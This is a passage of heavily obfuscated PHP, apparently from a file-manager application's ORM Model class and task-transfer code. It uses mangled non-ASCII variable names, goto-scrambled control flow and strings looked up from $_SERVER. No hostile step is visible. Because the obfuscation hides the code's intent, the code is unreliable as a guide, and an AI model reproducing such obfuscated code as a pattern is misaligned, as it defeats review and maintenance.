$_SERVER[Šº]; $E¿¤–øÔÑ = array($A†´èâ[780] => $dè…‹íÜÚ¸); $eÜáõìÜŒí = Model($A†´èâ[457])->where($E¿¤–øÔÑ)->count(); goto c‹¨Öìš»ä; C„ìïØƒÕ„: $A¹‚‹©ôî”->task[$A†´èâ[721]] = (double) $e§‘İâ§Ñ‰; $dÆ‰Ğ±‘Ãá = KodIO::defaultDriver(); $DŞÀòŒÍæÍ = $dÆ‰Ğ±‘Ãá[$A†´èâ[392]]; goto B°ĞŞ±ƒ²Ú; bÁºŠË“¿Ü: if (!$B¥ªƒ²¡¾¶) { $A¹‚‹©ôî”->stop($Bîµ×¸ïÛÁ); return !1; } $A¹‚‹©ôî”->end(); if ($eÕô½§†‹Œ == $A†´èâ[1643]) { $this->remove($dè…‹íÜÚ¸); } goto eãİÒ’ŸŸ·; c‹¨Öìš»ä: $e§‘İâ§Ñ‰ = Model($A†´èâ[457])->where($E¿¤–øÔÑ)->sum($A†´èâ[78]); $Bîµ×¸ïÛÁ = $eÕô½§†‹Œ . $A†´èâ[1987] . $dè…‹íÜÚ¸; $A¹‚‹©ôî” = new TaskFileTransfer($Bîµ×¸ïÛÁ, $A†´èâ[1982], $eÜáõìÜŒí, LNG($A†´èâ[1988]) . "\x28{$dè…‹íÜÚ¸}\51"); goto C„ìïØƒÕ„; eãİÒ’ŸŸ·: } public function progress($D„…Ş™µäÆ, $AÕÒ¾ÁÜ‡) { return Task::get($AÕÒ¾ÁÜ‡ . $_SERVER[Šº][1987] . $D„…Ş™µäÆ); } private function removeByFileID($e…·ÅË¯å = array()) { goto B«Ñ¦Âæê; C†ëª¡šÑƒ: foreach ($EÄ–ºî¿¯ as $a·ºøÍ‡ê¥) { Model($A¥Ü¡ƒí­¶[416])->removeNow($a·ºøÍ‡ê¥, !1); } goto aµÈè‹…³Ä; B«Ñ¦Âæê: $A¥Ü¡ƒí­¶ =& $_SERVER[Šº]; if (empty($e…·ÅË¯å)) { return; } $D©›‘­–æ› = array($A¥Ü¡ƒí­¶[454] => array($A¥Ü¡ƒí­¶[7], $e…·ÅË¯å)); goto dµ›­·Ê¯²; dµ›­·Ê¯²: $EÄ–ºî¿¯ = Model($A¥Ü¡ƒí­¶[1192])->where($D©›‘­–æ›)->field($A¥Ü¡ƒí­¶[403])->select(); if (!$EÄ–ºî¿¯) { return; } $EÄ–ºî¿¯ = array_to_keyvalue($EÄ–ºî¿¯, $A¥Ü¡ƒí­¶[33], $A¥Ü¡ƒí­¶[403]); goto C†ëª¡šÑƒ; aµÈè‹…³Ä: } private function removeShareItems($BÂÄÅ‹‡Ğ) { goto F¸Ï³¹«í…; Cƒ¹¡µÃ·‡: Model($e¢ƒñğ¹Öƒ[571])->remove($CÅ«­¦‹Ÿ); goto aĞ®ì×¸ÈÈ; F¸Ï³¹«í…: $e¢ƒñğ¹Öƒ =& $_SERVER[Šº]; $BÎ­Óà¾‚— = "\x7b\x69\x6f\x3a{$BÂÄÅ‹‡Ğ}\x7d\x2f"; $fÚÛØÒâ = array($e¢ƒñğ¹Öƒ[403] => 0, $e¢ƒñğ¹Öƒ[1059] => array($e¢ƒñğ¹Öƒ[379], "{$BÎ­Óà¾‚—}\45")); goto CéÙÍåò°°; CéÙÍåò°°: $b«øÑÜƒ¢† = Model($e¢ƒñğ¹Öƒ[1654])->where($fÚÛØÒâ)->field($e¢ƒñğ¹Öƒ[475])->select(); if (empty($b«øÑÜƒ¢†)) { return; } $CÅ«­¦‹Ÿ = array_to_keyvalue($b«øÑÜƒ¢†, $e¢ƒñğ¹Öƒ[33], $e¢ƒñğ¹Öƒ[475]); goto Cƒ¹¡µÃ·‡; aĞ®ì×¸ÈÈ: } } goto cˆëìÍ ·Ù; F˜£—ÜÇ: define($_SERVER[Šº][239], 0); define($_SERVER[Šº][240], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\x6f\x72\x64\145\162", "\141\154\151\141\x73", "\x68\141\166\x69\x6e\x67", "\147\x72\x6f\165\160", "\x6c\157\143\x6b", "\144\151\x73\x74\151\156\143\x74", "\x61\x75\x74\x6f", "\x66\x69\154\x74\145\162", "\x76\x61\154\x69\x64\x61\164\x65", "\x72\145\x73\x75\x6c\164", "\x62\x69\156\x64", "\x74\x6f\153\145\156"); public function __construct($eà¡æõ„³ = '', $e§Ÿùá³À = '', $f’©éæçˆ = '') { $E¢¯Ş°µŞÏ =& $_SERVER[Šº]; $this->_initialize(); if (!empty($eà¡æõ„³)) { if (strpos($eà¡æõ„³, $E¢¯Ş°µŞÏ[95])) { list($this->dbName, $this->name) = explode($E¢¯Ş°µŞÏ[95], $eà¡æõ„³); } else { $this->name = $eà¡æõ„³; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($e§Ÿùá³À)) { $this->tablePrefix = $E¢¯Ş°µŞÏ[33]; } elseif ($E¢¯Ş°µŞÏ[33] != $e§Ÿùá³À) { $this->tablePrefix = $e§Ÿùá³À; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($E¢¯Ş°µŞÏ[241]); } $this->db(0, empty($this->connection) ? $f’©éæçˆ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $dùìŠ¾ˆ‹î =& $_SERVER[Šº]; if (empty($this->fields)) { if (think_config($dùìŠ¾ˆ‹î[242])) { $bÄö’ç…ˆ¾ = $this->dbName ? $this->dbName : think_config($dùìŠ¾ˆ‹î[243]); $fÂšºç = think_var_cache($dùìŠ¾ˆ‹î[244] . strtolower(get_path_this($bÄö’ç…ˆ¾) . $dùìŠ¾ˆ‹î[95] . $this->name)); if ($fÂšºç) { $C»‡í±ËŠ = think_config($dùìŠ¾ˆ‹î[245]); if (empty($C»‡í±ËŠ) || $fÂšºç[$dùìŠ¾ˆ‹î[246]] == $C»‡í±ËŠ) { $this->fields = $fÂšºç; return; } } } $this->flush(); } } public function flush() { goto A™Äø‡óÖ‘; C›ã¢ãáÂ»: if (!$eÔ£ÈˆÏ®£) { return !1; } $this->fields = array_keys($eÔ£ÈˆÏ®£); $this->fields[$FÑòåªÔº[247]] = !1; goto Dºøâ…Š›…; b¹‘Îèœœè: if (think_config($FÑòåªÔº[242])) { $A™×éšğ©„ = $this->dbName ? $this->dbName : think_config($FÑòåªÔº[243]); think_var_cache($FÑòåªÔº[244] . strtolower(get_path_this($A™×éšğ©„) . $FÑòåªÔº[95] . $this->name), $this->fields); } goto aóŞä´„Ëİ; A™Äø‡óÖ‘: $FÑòåªÔº =& $_SERVER[Šº]; $this->db->setModel($this->name); $eÔ£ÈˆÏ®£ = $this->db->getFields($this->getTableName()); goto C›ã¢ãáÂ»; Dºøâ…Š›…: foreach ($eÔ£ÈˆÏ®£ as $Eš©¦íİ¼¨ => $b®ò‚×©ëÀ) { $EĞŠ‚®ìØö[$Eš©¦íİ¼¨] = $b®ò‚×©ëÀ[$FÑòåªÔº[29]]; if ($b®ò‚×©ëÀ[$FÑòåªÔº[36]]) { $this->fields[$FÑòåªÔº[248]] = $Eš©¦íİ¼¨; if ($b®ò‚×©ëÀ[$FÑòåªÔº[39]]) { $this->fields[$FÑòåªÔº[247]] = !0; } } } $this->fields[$FÑòåªÔº[249]] = $EĞŠ‚®ìØö; if (think_config($FÑòåªÔº[245])) { $this->fields[$FÑòåªÔº[246]] = think_config($FÑòåªÔº[245]); } goto b¹‘Îèœœè; aóŞä´„Ëİ: } public function switchModel($Aá™ù“æ, $bˆ•ùŠ´Ï = array()) { $DæÊ¼ÚÆ›Å =& $_SERVER[Šº]; $EäŞÖ‰æ†Î = ucwords(strtolower($Aá™ù“æ)) . $DæÊ¼ÚÆ›Å[250]; if (!class_exists($EäŞÖ‰æ†Î)) { think_exception($EäŞÖ‰æ†Î . think_lang($DæÊ¼ÚÆ›Å[251])); } $this->_extModel = new $EäŞÖ‰æ†Î($this->name); if (!empty($bˆ•ùŠ´Ï)) { foreach ($bˆ•ùŠ´Ï as $DáØãí¨µ²) { $this->_extModel->setProperty($DáØãí¨µ², $this->{$DáØãí¨µ²}); } } return $this->_extModel; } public function __set($fÓ¨„…ÀëÏ, $fâ¯Á›—ã“) { $this->data[$fÓ¨„…ÀëÏ] = $fâ¯Á›—ã“; } public function __get($e³¤ˆ•¹µê) { return isset($this->data[$e³¤ˆ•¹µê]) ? $this->data[$e³¤ˆ•¹µê] : null; } public function __isset($Fòµğ‚¯‰Ì) { return isset($this->data[$Fòµğ‚¯‰Ì]); } public function __unset($c®ˆö¶§ßè) { unset($this->data[$c®ˆö¶§ßè]); } public function __call($EÚå§®ÃÇ, $f†±ùí‘°–) { $bæÙ‰˜ÄÁ´ =& $_SERVER[Šº]; if (in_array(strtolower($EÚå§®ÃÇ), $this->methods, !0)) { $this->options[strtolower($EÚå§®ÃÇ)] = $f†±ùí‘°–[0]; return $this; } elseif (in_array(strtolower($EÚå§®ÃÇ), array($bæÙ‰˜ÄÁ´[252], $bæÙ‰˜ÄÁ´[253], $bæÙ‰˜ÄÁ´[254], $bæÙ‰˜ÄÁ´[255], $bæÙ‰˜ÄÁ´[256]), !0)) { $A–§¥‰—È = isset($f†±ùí‘°–[0]) ? $f†±ùí‘°–[0] : $bæÙ‰˜ÄÁ´[182]; $A–§¥‰—È = $this->db->parseKey($A–§¥‰—È); return $this->getField(strtoupper($EÚå§®ÃÇ) . $bæÙ‰˜ÄÁ´[257] . $A–§¥‰—È . $bæÙ‰˜ÄÁ´[258] . $EÚå§®ÃÇ, $bæÙ‰˜ÄÁ´[252]); } elseif (strtolower(substr($EÚå§®ÃÇ, 0, 5)) == $bæÙ‰˜ÄÁ´[259]) { $A–§¥‰—È = think_parse_name(substr($EÚå§®ÃÇ, 5)); $D‹À‰‚£Ò[$A–§¥‰—È] = $f†±ùí‘°–[0]; return $this->where($D‹À‰‚£Ò)->find(); } elseif (strtolower(substr($EÚå§®ÃÇ, 0, 10)) == $bæÙ‰˜ÄÁ´[260]) { $C××‘ô•·ª = think_parse_name(substr($EÚå§®ÃÇ, 10)); $D‹À‰‚£Ò[$C××‘ô•·ª] = $f†±ùí‘°–[0]; return $this->where($D‹À‰‚£Ò)->getField($f†±ùí‘°–[1]); } elseif (isset($this->_scope[$EÚå§®ÃÇ])) { return $this->scope($EÚå§®ÃÇ, $f†±ùí‘°–[0]); } elseif (method_exists($this, $EÚå§®ÃÇ)) { array_unshift($f†±ùí‘°–, $EÚå§®ÃÇ); return call_user_func_array(array($this, $bæÙ‰˜ÄÁ´[261]), $f†±ùí‘°–); } else { return call_user_func_array(array(parent, $EÚå§®ÃÇ), $f†±ùí‘°–); } } protected function call() { goto B§÷‰¼ÃĞ»; dò¢ŒÄÅÛ: $Eº¹ì¡ªïŸ = $eÑä¥‰“Î; if (is_array($eÑä¥‰“Î)) { $Eº¹ì¡ªïŸ = $eÑä¥‰“Î[1]; $eÑä¥‰“Î = $eÑä¥‰“Î[0]; } $C™·é»Äß = count($a—ñ¯×¾‚Í) - 1; goto Aåò¾Á¦ï¡; Aåò¾Á¦ï¡: if (isset($a—ñ¯×¾‚Í[$C™·é»Äß]) && $a—ñ¯×¾‚Í[$C™·é»Äß] === $eÑä¥‰“Î) { think_exception(__CLASS__ . $d¶¢´ïÉÀË[4] . $eÑä¥‰“Î . think_lang($d¶¢´ïÉÀË[262])); return; } $a—ñ¯×¾‚Í[] = $eÑä¥‰“Î; if (method_exists($this, $d¶¢´ïÉÀË[263])) { $b««ã—’ÏŒ = call_user_func_array(array($this, $d¶¢´ïÉÀË[264]), array($Eº¹ì¡ªïŸ, $a—ñ¯×¾‚Í)); if (!is_null($b««ã—’ÏŒ) && $b««ã—’ÏŒ !== !1) { return $b««ã—’ÏŒ; } } goto eß½¤¸Ä°; eß½¤¸Ä°: $bİ‡†“ Ï´ = call_user_func_array(array($this, $eÑä¥‰“Î), $a—ñ¯×¾‚Í); if (method_exists($this, $d¶¢´ïÉÀË[265])) { $b««ã—’ÏŒ = call_user_func_array(array($this, $d¶¢´ïÉÀË[266]), array($Eº¹ì¡ªïŸ, $a—ñ¯×¾‚Í, $bİ‡†“ Ï´)); if ($b««ã—’ÏŒ) { return $b««ã—’ÏŒ; } } return $bİ‡†“ Ï´; goto F­½ŞÒÂ±ñ; B§÷‰¼ÃĞ»: $d¶¢´ïÉÀË =& $_SERVER[Šº]; $a—ñ¯×¾‚Í = func_get_args(); $eÑä¥‰“Î = array_shift($a—ñ¯×¾‚Í); goto dò¢ŒÄÅÛ; F­½ŞÒÂ±ñ: } protected function _initialize() { } protected function _facade($Dªæ„ÛªíŞ) { $FÎšÆ„È”÷ =& $_SERVER[Šº]; if (!empty($this->fields)) { foreach ($Dªæ„ÛªíŞ as $fµÛ­›Ó‡™ => $d×…ö¼æ¦) { if (is_array($this->fields) && !in_array($fµÛ­›Ó‡™, $this->fields, !0)) { unset($Dªæ„ÛªíŞ[$fµÛ­›Ó‡™]); } elseif (is_scalar($d×…ö¼æ¦)) { $this->_parseType($Dªæ„ÛªíŞ, $fµÛ­›Ó‡™); } } } if (!empty($this->options[$FÎšÆ„È”÷[267]])) { $Dªæ„ÛªíŞ = array_map($this->options[$FÎšÆ„È”÷[267]], $Dªæ„ÛªíŞ); unset($this->options[$FÎšÆ„È”÷[267]]); } $this->_beforeWrite($Dªæ„ÛªíŞ); return $Dªæ„ÛªíŞ; } protected function _beforeWrite(&$a…Åù¯Âöô) { } public function add($f¶™´¯¹ = '', $E¥‹‹Æ‘Ç = array(), $e©¯ØŠË‚ö = false) { goto B®¿Ç™µ„›; e²áˆÈƒ÷ï: if (!1 === $this->_beforeInsert($f¶™´¯¹, $E¥‹‹Æ‘Ç)) { return !1; } $F½¬ö¤Ü‚ = $this->db->insert($f¶™´¯¹, $E¥‹‹Æ‘Ç, $e©¯ØŠË‚ö); if (!1 !== $F½¬ö¤Ü‚) { $b¥÷Ëôò÷Ù = $this->getLastInsID(); if ($b¥÷Ëôò÷Ù) { $f¶™´¯¹[$this->getPk()] = $b¥÷Ëôò÷Ù; $this->_after_insert($f¶™´¯¹, $E¥‹‹Æ‘Ç); return $b¥÷Ëôò÷Ù; } $this->_after_insert($f¶™´¯¹, $E¥‹‹Æ‘Ç); } goto DİÆ»“İ²¯; DİÆ»“İ²¯: return $F½¬ö¤Ü‚; goto f—çÔ¦ãé; B®¿Ç™µ„›: if (empty($f¶™´¯¹)) { if (!empty($this->data)) { $f¶™´¯¹ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Šº][268]); return !1; } } $E¥‹‹Æ‘Ç = $this->_parseOptions($E¥‹‹Æ‘Ç); $f¶™´¯¹ = $this->_facade($f¶™´¯¹); goto e²áˆÈƒ÷ï; f—çÔ¦ãé: } protected function _beforeInsert(&$f¬µ¹è³ß÷, $c¬ã¨İŒ§Ñ) { } protected function _after_insert($AÑÕ†´Ø‹ô, $DÀŒ®»ç‘Á) { } public function addAll($aí–÷©Š¯, $E‚Óêñù¾ = array(), $F¼“„ØáË = false) { goto E«Ù©„„»á; døšéØš²Ë: foreach ($aí–÷©Š¯ as $b³’â¡ŸÎ£ => $d¥—ä­‘ù­) { $aí–÷©Š¯[$b³’â¡ŸÎ£] = $this->_facade($d¥—ä­‘ù­); } if (method_exists($this->db, $d§§Š¤…‰ç[269])) { $a­×ÌÄÙª® = $this->db->insertAll($aí–÷©Š¯, $E‚Óêñù¾, $F¼“„ØáË); } else { $this->startTrans(); foreach ($aí–÷©Š¯ as $b³’â¡ŸÎ£ => $d¥—ä­‘ù­) { $a­×ÌÄÙª® = $this->db->insert($d¥—ä­‘ù­, $E‚Óêñù¾, $F¼“„ØáË); } $this->commit(); } if (!1 !== $a­×ÌÄÙª®) { $FÙæ¸ùëƒñ = $this->getLastInsID(); if ($FÙæ¸ùëƒñ) { return $FÙæ¸ùëƒñ; } } goto BË•®ïƒ¥â; E«Ù©„„»á: $d§§Š¤…‰ç =& $_SERVER[Šº]; if (empty($aí–÷©Š¯)) { $this->error = think_lang($d§§Š¤…‰ç[268]); return !1; } $E‚Óêñù¾ = $this->_parseOptions($E‚Óêñù¾); goto døšéØš²Ë; BË•®ïƒ¥â: return $a­×ÌÄÙª®; goto A©²ƒòÚåŞ; A©²ƒòÚåŞ: } public function selectAdd($a¸¿çÀŞª = '', $eê®ê•ã = '', $d†‚ì¢“ßË = array()) { $CÈ©êé…Ü =& $_SERVER[Šº]; $d†‚ì¢“ßË = $this->_parseOptions($d†‚ì¢“ßË); if (!1 === ($CÅù†ğŞ·š = $this->db->selectInsert($a¸¿çÀŞª ? $a¸¿çÀŞª : $d†‚ì¢“ßË[$CÈ©êé…Ü[270]], $eê®ê•ã ? $eê®ê•ã : $this->getTableName(), $d†‚ì¢“ßË))) { $this->error = think_lang($CÈ©êé…Ü[271]); return !1; } else { return $CÅù†ğŞ·š; } } public function save($cß¥ØèÄ’ = '', $BÛíÜŠ²­‰ = array()) { goto bõ²Ÿ§”¤ƒ; b¬’—‰§¾: if (!1 !== $d‘èºö¾Â®) { if (isset($a‡Ã½Ë¡ª¬)) { $cß¥ØèÄ’[$e÷¢²Å¸] = $a‡Ã½Ë¡ª¬; } $this->_afterUpdate($cß¥ØèÄ’, $BÛíÜŠ²­‰); } return $d‘èºö¾Â®; goto DÔè¢Šõ÷‰; C³Ë©äŸ«: $BÛíÜŠ²­‰ = $this->_parseOptions($BÛíÜŠ²­‰); $e÷¢²Å¸ = $this->getPk(); if (!isset($BÛíÜŠ²­‰[$eá’‘¢ãÓô[272]])) { if (isset($cß¥ØèÄ’[$e÷¢²Å¸])) { $Cé·Ë‚â—[$e÷¢²Å¸] = $cß¥ØèÄ’[$e÷¢²Å¸]; $BÛíÜŠ²­‰[$eá’‘¢ãÓô[272]] = $Cé·Ë‚â—; unset($cß¥ØèÄ’[$e÷¢²Å¸]); } else { $this->error = think_lang($eá’‘¢ãÓô[271]); return !1; } } goto A»›ä… œã; A»›ä… œã: if (is_array($BÛíÜŠ²­‰[$eá’‘¢ãÓô[272]]) && isset($BÛíÜŠ²­‰[$eá’‘¢ãÓô[272]][$e÷¢²Å¸])) { $a‡Ã½Ë¡ª¬ = $BÛíÜŠ²­‰[$eá’‘¢ãÓô[272]][$e÷¢²Å¸]; } if (!1 === $this->_beforeUpdate($cß¥ØèÄ’, $BÛíÜŠ²­‰)) { return !1; } $d‘èºö¾Â® = $this->db->update($cß¥ØèÄ’, $BÛíÜŠ²­‰); goto b¬’—‰§¾; bõ²Ÿ§”¤ƒ: $eá’‘¢ãÓô =& $_SERVER[Šº]; if (empty($cß¥ØèÄ’)) { if (!empty($this->data)) { $cß¥ØèÄ’ = $this->data; $this->data = array(); } else { $this->error = think_lang($eá’‘¢ãÓô[268]); return !1; } } $cß¥ØèÄ’ = $this->_facade($cß¥ØèÄ’); goto C³Ë©äŸ«; DÔè¢Šõ÷‰: } protected function _beforeUpdate(&$b˜¯¢ğ”ê„, $eÛ¤¸Ãïà) { } protected function _afterUpdate($E¢¡îãÆ´ƒ, $däŒÍæ«È„) { } public function delete($dà‚ë‚è¶Ö = array()) { goto a¶•ÄÑ÷³»; F—ò‰ĞÔ©: $BœéÜìÅö = $this->db->delete($dà‚ë‚è¶Ö); if (!1 !== $BœéÜìÅö) { $B·†ï¢…ò = array(); if (isset($dˆ‹çìŒ¶)) { $B·†ï¢…ò[$C˜“’¿êöÙ] = $dˆ‹çìŒ¶; } $this->_after_delete($B·†ï¢…ò, $dà‚ë‚è¶Ö); } return $BœéÜìÅö; goto c÷ÓÓµ¶‹; a¶•ÄÑ÷³»: $FáÕ‹’î¥¯ =& $_SERVER[Šº]; if (empty($dà‚ë‚è¶Ö) && empty($this->options[$FáÕ‹’î¥¯[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $C˜“’¿êöÙ = $this->getPk(); goto FØØ©Ú¹á·; FØØ©Ú¹á·: if (is_numeric($dà‚ë‚è¶Ö) || is_string($dà‚ë‚è¶Ö)) { if (strpos($dà‚ë‚è¶Ö, $FáÕ‹’î¥¯[47])) { $CğìÍÊ [$C˜“’¿êöÙ] = array($FáÕ‹’î¥¯[273], $dà‚ë‚è¶Ö); } else { $CğìÍÊ [$C˜“’¿êöÙ] = $dà‚ë‚è¶Ö; } $this->options[$FáÕ‹’î¥¯[272]] = $CğìÍÊ ; } $dà‚ë‚è¶Ö = $this->_parseOptions(); if (is_array($dà‚ë‚è¶Ö[$FáÕ‹’î¥¯[272]]) && isset($dà‚ë‚è¶Ö[$FáÕ‹’î¥¯[272]][$C˜“’¿êöÙ])) { $dˆ‹çìŒ¶ = $dà‚ë‚è¶Ö[$FáÕ‹’î¥¯[272]][$C˜“’¿êöÙ]; } goto F—ò‰ĞÔ©; c÷ÓÓµ¶‹: } protected function _after_delete($Fæœ˜×ŠÚ, $a‹Ï œ¶ëà) { } public function select($b„µ¢¾Œ„— = array()) { goto cœ¦Î®Çä; FğÀìì¹ß: $this->_afterSelect($FÖèÙ¿š¶Â, $b„µ¢¾Œ„—); return $FÖèÙ¿š¶Â; goto E¹˜’õí„¯; cœ¦Î®Çä: $f‰×ïŸˆß™ =& $_SERVER[Šº]; if (is_string($b„µ¢¾Œ„—) || is_numeric($b„µ¢¾Œ„—)) { $e§™ù‰ƒ¹… = $this->getPk(); if (strpos($b„µ¢¾Œ„—, $f‰×ïŸˆß™[47])) { $e“¥ä†±ù[$e§™ù‰ƒ¹…] = array($f‰×ïŸˆß™[273], $b„µ¢¾Œ„—); } else { $e“¥ä†±ù[$e§™ù‰ƒ¹…] = $b„µ¢¾Œ„—; } $this->options[$f‰×ïŸˆß™[272]] = $e“¥ä†±ù; } elseif (!1 === $b„µ¢¾Œ„—) { $b„µ¢¾Œ„— = $this->_parseOptions(); return $f‰×ïŸˆß™[274] . $this->db->buildSelectSql($b„µ¢¾Œ„—) . $f‰×ïŸˆß™[275]; } $b„µ¢¾Œ„— = $this->_parseOptions(); goto FÛÙÙ°ó’; FÛÙÙ°ó’: $FÖèÙ¿š¶Â = $this->db->select($b„µ¢¾Œ„—); if (!1 === $FÖèÙ¿š¶Â) { return !1; } if (empty($FÖèÙ¿š¶Â)) { return null; } goto FğÀìì¹ß; E¹˜’õí„¯: } protected function _afterSelect(&$a¶Š ’»ëá, $Bãõ°÷¤) { } public function buildSql($fµ ¹…ƒù = array()) { $C‰ ë‘ÏÇ =& $_SERVER[Šº]; $fµ ¹…ƒù = $this->_parseOptions($fµ ¹…ƒù); return $C‰ ë‘ÏÇ[274] . $this->db->buildSelectSql($fµ ¹…ƒù) . $C‰ ë‘ÏÇ[275]; } public function optionsValue($EÂÃ½à‡æ = null) { if (is_null($EÂÃ½à‡æ)) { return $this->options; } elseif (is_array($EÂÃ½à‡æ)) { $this->options = array_merge($this->options, $EÂÃ½à‡æ); } } protected function _parseOptions($EÊÉö­İ¬ø = array()) { goto eŸÚÓ”¸ğ; dçÎÜ‹—‰õ: if (isset($EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[272]]) && is_array($EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[272]]) && !empty($B¨î”‘çß) && !isset($EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[279]]) && !isset($EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[276]])) { foreach ($EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[272]] as $c±¤¨˜æãÔ => $d²¶œ³’Õ±) { $c±¤¨˜æãÔ = trim($c±¤¨˜æãÔ); if (in_array($c±¤¨˜æãÔ, $B¨î”‘çß, !0)) { if (is_scalar($d²¶œ³’Õ±)) { $this->_parseType($EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[272]], $c±¤¨˜æãÔ); } } elseif (!is_numeric($c±¤¨˜æãÔ) && $E—¬âƒ¥šÕ[71] != substr($c±¤¨˜æãÔ, 0, 1) && !1 === strpos($c±¤¨˜æãÔ, $E—¬âƒ¥šÕ[95]) && !1 === strpos($c±¤¨˜æãÔ, $E—¬âƒ¥šÕ[257]) && !1 === strpos($c±¤¨˜æãÔ, $E—¬âƒ¥šÕ[280]) && !1 === strpos($c±¤¨˜æãÔ, $E—¬âƒ¥šÕ[281])) { unset($EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[272]][$c±¤¨˜æãÔ]); } } } $this->_options_filter($EÊÉö­İ¬ø); return $EÊÉö­İ¬ø; goto Bè¹ˆÏ„Ãì; b¹õ£ŸĞ«â: if (!isset($EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[276]])) { $EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[276]] = $this->getTableName(); $B¨î”‘çß = $this->fields; } else { $B¨î”‘çß = $this->getDbFields(); } if (!empty($EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[277]])) { $EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[276]] .= $E—¬âƒ¥šÕ[50] . $EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[277]]; } $EÊÉö­İ¬ø[$E—¬âƒ¥šÕ[278]] = $this->name; goto dçÎÜ‹—‰õ; eŸÚÓ”¸ğ: $E—¬âƒ¥šÕ =& $_SERVER[Šº]; if (is_array($EÊÉö­İ¬ø)) { $EÊÉö­İ¬ø = array_merge($this->options, $EÊÉö­İ¬ø); } $this->options = array(); goto b¹õ£ŸĞ«â; Bè¹ˆÏ„Ãì: } protected function _options_filter(&$bÆğêŠŸÒà) { } protected function _parseType(&$Báë‡îš©í, $Bö´Î‹”¿Ü) { $F†ÍŠÓº‚ =& $_SERVER[Šº]; if (empty($this->options[$F†ÍŠÓº‚[282]][$F†ÍŠÓº‚[4] . $Bö´Î‹”¿Ü])) { $Aì˜½“ò—» = strtolower($this->fields[$F†ÍŠÓº‚[249]][$Bö´Î‹”¿Ü]); if (!1 !== strpos($Aì˜½“ò—», $F†ÍŠÓº‚[283])) { } elseif (!1 === strpos($Aì˜½“ò—», $F†ÍŠÓº‚[284]) && !1 !== strpos($Aì˜½“ò—», $F†ÍŠÓº‚[285])) { $Báë‡îš©í[$Bö´Î‹”¿Ü] = intval($Báë‡îš©í[$Bö´Î‹”¿Ü]); } elseif (!1 !== strpos($Aì˜½“ò—», $F†ÍŠÓº‚[286]) || !1 !== strpos($Aì˜½“ò—», $F†ÍŠÓº‚[287])) { $Báë‡îš©í[$Bö´Î‹”¿Ü] = floatval($Báë‡îš©í[$Bö´Î‹”¿Ü]); } elseif (!1 !== strpos($Aì˜½“ò—», $F†ÍŠÓº‚[288])) { $Báë‡îš©í[$Bö´Î‹”¿Ü] = (bool) $Báë‡îš©í[$Bö´Î‹”¿Ü]; } } } public function find($c°¯åì˜ŒÛ = array()) { goto Dº¡ñèçš×; eø¶«á¦îÏ: if (empty($F¾é•ºŒ¹ë)) { return null; } $this->data = $F¾é•ºŒ¹ë[0]; $this->_afterFind($this->data, $c°¯åì˜ŒÛ); goto CòìåÒóÊ; CòìåÒóÊ: if (!empty($this->options[$F­à™Í·ˆŞ[290]])) { return $this->returnResult($this->data, $this->options[$F­à™Í·ˆŞ[290]]); } return $this->data; goto aÌ§ø¸Áà; Dº¡ñèçš×: $F­à™Í·ˆŞ =& $_SERVER[Šº]; if (is_numeric($c°¯åì˜ŒÛ) || is_string($c°¯åì˜ŒÛ)) { $b¨ŒÂË“Õ¨[$this->getPk()] = intval($c°¯åì˜ŒÛ); $this->options[$F­à™Í·ˆŞ[272]] = $b¨ŒÂË“Õ¨; } $this->options[$F­à™Í·ˆŞ[289]] = 1; goto cª³ã™ÈÃ²; cª³ã™ÈÃ²: $c°¯åì˜ŒÛ = $this->_parseOptions(); $F¾é•ºŒ¹ë = $this->db->select($c°¯åì˜ŒÛ); if (!1 === $F¾é•ºŒ¹ë) { return !1; } goto eø¶«á¦îÏ; aÌ§ø¸Áà: } protected function _afterFind(&$DÀäŒ™êŞ½, $CÆÁ¤ ñ¼) { } protected function returnResult($dÚàØ§æĞŒ, $e›¾‡§Ö¢‰ = '') { $AÖŠœÌŒ© =& $_SERVER[Šº]; if ($e›¾‡§Ö¢‰) { if (is_callable($e›¾‡§Ö¢‰)) { return call_user_func($e›¾‡§Ö¢‰, $dÚàØ§æĞŒ); } switch (strtolower($e›¾‡§Ö¢‰)) { case $AÖŠœÌŒ©[291]: return json_encode($dÚàØ§æĞŒ); case $AÖŠœÌŒ©[292]: return xml_encode($dÚàØ§æĞŒ); } } return $dÚàØ§æĞŒ; } public function parseFieldsMap($b¹í­Àä±ï, $F‘²‘²‘éŸ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $DÎ¶±„ÁêÉ => $aÈÖˆøÕéŠ) { if ($F‘²‘²‘éŸ == 1) { if (isset($b¹í­Àä±ï[$aÈÖˆøÕéŠ])) { $b¹í­Àä±ï[$DÎ¶±„ÁêÉ] = $b¹í­Àä±ï[$aÈÖˆøÕéŠ]; unset($b¹í­Àä±ï[$aÈÖˆøÕéŠ]); } } else { if (isset($b¹í­Àä±ï[$DÎ¶±„ÁêÉ])) { $b¹í­Àä±ï[$aÈÖˆøÕéŠ] = $b¹í­Àä±ï[$DÎ¶±„ÁêÉ]; unset($b¹í­Àä±ï[$DÎ¶±„ÁêÉ]); } } } } return $b¹í­Àä±ï; } public function setField($b´›ö»“ëÈ, $bî•öÆ²ÒÈ = '') { if (is_array($b´›ö»“ëÈ)) { 